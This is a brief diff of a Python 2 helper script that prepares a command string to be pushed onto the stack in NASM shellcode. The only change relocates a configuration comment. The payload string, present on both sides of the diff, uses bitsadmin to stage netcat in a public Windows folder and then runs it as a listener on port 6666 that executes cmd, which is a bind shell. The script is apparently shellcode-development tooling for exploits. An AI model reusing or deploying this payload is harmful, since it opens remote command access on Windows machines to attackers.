@@ -1,7 +1,8 @@
 #CODED BY ZINZLOUN
 #CREATE THE NASM INSTRUCTION TO PUSH A STRING INTO THE STACK
 
-line = 'cmd /c bitsadmin.exe /transfer 11 C:\\Users\\fbersani\\Desktop\\netcat\\nc.exe C:\\Users\\Public\\Downloads\\nc1.exe & C:\\Users\\Public\\Downloads\\nc1.exe -lvp 6666 -e cmd' #TO BE CONFIGURED
+#TO BE CONFIGURED
+line = 'cmd /c bitsadmin.exe /transfer 11 C:\\Users\\fbersani\\Desktop\\netcat\\nc.exe C:\\Users\\Public\\Downloads\\nc1.exe & C:\\Users\\Public\\Downloads\\nc1.exe -lvp 6666 -e cmd'
 
 print "Command string is [" + line + "]"
 print "Length " + str(len(line))
